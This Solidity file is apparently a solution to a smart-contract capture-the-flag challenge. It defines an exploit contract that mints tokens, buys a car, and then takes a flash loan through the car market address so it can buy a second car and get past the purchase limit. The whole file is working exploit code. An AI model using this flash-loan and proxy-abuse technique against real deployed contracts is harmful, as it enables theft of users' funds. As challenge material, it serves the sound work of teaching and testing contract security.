// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "./CarToken.sol";
import "./CarMarket.sol";
import "./CarFactory.sol";

function playerScript(address marketAddress) returns (address exploitAddress) {
    CarMarketExploit exploit = new CarMarketExploit();
    exploit.exploit(marketAddress);
    return address(exploit);
}

contract CarMarketExploit {
    CarMarket market;
    CarToken token;
    CarFactory factory;

    function exploit(address marketAddress) public {
        market = CarMarket(marketAddress);
        token = CarToken(address(market.getCarToken()));
        factory = CarFactory(market.getCarFactory());
        token.mint();

        token.approve(address(market), type(uint256).max);
        market.purchaseCar("", "", "");

        CarFactory(address(market)).flashLoan(token.balanceOf(address(factory)));

        market.purchaseCar("", "", "");
    }

    function receivedCarToken(address) public {}
}
